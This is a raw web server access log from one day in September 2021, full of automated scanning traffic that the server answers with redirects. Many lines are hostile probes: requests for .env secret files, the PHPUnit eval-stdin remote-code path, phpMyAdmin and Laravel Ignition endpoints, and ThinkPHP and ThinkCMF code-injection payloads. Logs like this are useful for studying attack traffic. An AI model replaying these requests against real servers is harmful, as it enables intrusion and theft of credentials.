103.156.90.219 - - [14/Sep/2021:04:48:28 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.32.221 - - [14/Sep/2021:04:53:48 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.32.221 - - [14/Sep/2021:04:53:48 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
107.189.14.98 - - [14/Sep/2021:05:18:19 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:05:18:19 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
159.65.88.210 - - [14/Sep/2021:05:25:23 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:05:25:23 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:05:25:23 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:05:25:23 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.73.215.171 - - [14/Sep/2021:05:28:55 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
178.73.215.171 - - [14/Sep/2021:05:28:55 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
46.101.82.40 - - [14/Sep/2021:05:30:19 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:05:30:19 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:05:30:20 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:05:30:20 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
170.130.187.10 - - [14/Sep/2021:05:49:26 +0000] "GET / HTTP/1.1" 301 178 "-" "https://gdnplus.com:Gather Analyze Provide."
170.130.187.10 - - [14/Sep/2021:05:49:26 +0000] "GET / HTTP/1.1" 301 178 "-" "https://gdnplus.com:Gather Analyze Provide."
162.221.192.90 - - [14/Sep/2021:06:31:06 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.90 - - [14/Sep/2021:06:31:06 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.173.35.61 - - [14/Sep/2021:07:08:32 +0000] "GET / HTTP/1.0" 301 178 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
185.173.35.61 - - [14/Sep/2021:07:08:32 +0000] "GET / HTTP/1.0" 301 178 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
37.0.10.12 - - [14/Sep/2021:07:18:49 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
37.0.10.12 - - [14/Sep/2021:07:18:49 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
135.125.246.110 - - [14/Sep/2021:07:21:23 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:07:21:23 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:07:21:23 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:07:21:23 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.213.169 - - [14/Sep/2021:07:46:55 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
192.241.213.169 - - [14/Sep/2021:07:46:55 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 zgrab/0.x"
209.141.32.221 - - [14/Sep/2021:08:12:34 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.32.221 - - [14/Sep/2021:08:12:34 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
159.65.88.210 - - [14/Sep/2021:08:26:09 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:08:26:09 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:08:26:09 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.88.210 - - [14/Sep/2021:08:26:09 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:08:30:04 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:08:30:04 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:08:30:04 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
46.101.82.40 - - [14/Sep/2021:08:30:04 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
181.113.22.6 - - [14/Sep/2021:08:39:22 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
181.113.22.6 - - [14/Sep/2021:08:39:22 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
107.189.31.252 - - [14/Sep/2021:08:43:10 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
107.189.31.252 - - [14/Sep/2021:08:43:10 +0000] "GET /config/getuser?index=0 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
34.68.147.169 - - [14/Sep/2021:08:46:15 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.68.147.169 - - [14/Sep/2021:08:46:15 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.68.147.169 - - [14/Sep/2021:08:46:17 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.68.147.169 - - [14/Sep/2021:08:46:17 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.68.147.169 - - [14/Sep/2021:08:46:18 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
34.68.147.169 - - [14/Sep/2021:08:46:18 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
64.62.197.62 - - [14/Sep/2021:08:46:45 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
64.62.197.62 - - [14/Sep/2021:08:46:45 +0000] "GET / HTTP/1.1" 301 178 "-" "-"
125.64.94.138 - - [14/Sep/2021:09:15:00 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.138 - - [14/Sep/2021:09:15:00 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
107.189.14.98 - - [14/Sep/2021:09:33:33 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:09:33:33 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
80.82.77.192 - - [14/Sep/2021:10:05:59 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
80.82.77.192 - - [14/Sep/2021:10:05:59 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:10:23:27 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:10:23:27 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:10:23:27 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [14/Sep/2021:10:23:27 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:11:00:57 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:11:00:57 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:11:00:58 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:11:00:58 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.131.90.225 - - [14/Sep/2021:11:10:48 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.131.90.225 - - [14/Sep/2021:11:10:48 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.131.90.225 - - [14/Sep/2021:11:10:49 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.131.90.225 - - [14/Sep/2021:11:10:49 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.32.221 - - [14/Sep/2021:12:29:07 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.32.221 - - [14/Sep/2021:12:29:07 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
103.122.244.146 - - [14/Sep/2021:12:32:24 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
103.122.244.146 - - [14/Sep/2021:12:32:24 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
103.122.244.146 - - [14/Sep/2021:12:32:28 +0000] "GET /pmd/index.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
103.122.244.146 - - [14/Sep/2021:12:32:28 +0000] "GET /pmd/index.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
103.122.244.146 - - [14/Sep/2021:12:32:30 +0000] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
103.122.244.146 - - [14/Sep/2021:12:32:30 +0000] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
107.189.14.98 - - [14/Sep/2021:12:36:43 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
107.189.14.98 - - [14/Sep/2021:12:36:43 +0000] "GET / HTTP/1.1" 301 178 "-" "Linux Gnu (cow)"
194.49.68.9 - - [14/Sep/2021:12:50:47 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:12:50:47 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:12:50:48 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.49.68.9 - - [14/Sep/2021:12:50:48 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "POST /api/jsonws/invoke HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "POST /api/jsonws/invoke HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /console/ HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /console/ HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:51 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:52 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:52 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:53 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [14/Sep/2021:12:58:53 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.186.122.127 - - [14/Sep/2021:13:38:55 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.159.216 - - [14/Sep/2021:13:39:14 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
168.90.143.139 - - [14/Sep/2021:14:12:07 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
168.90.143.139 - - [14/Sep/2021:14:12:07 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.244.169.254 - - [14/Sep/2021:14:29:25 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.123.43.189 - - [14/Sep/2021:14:55:45 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
103.123.43.189 - - [14/Sep/2021:14:55:45 +0000] "GET / HTTP/1.0" 301 178 "-" "-"
209.141.32.221 - - [14/Sep/2021:15:56:53 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.32.221 - - [14/Sep/2021:15:56:53 +0000] "GET / HTTP/1.1" 301 178 "http://35.180.74.184:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
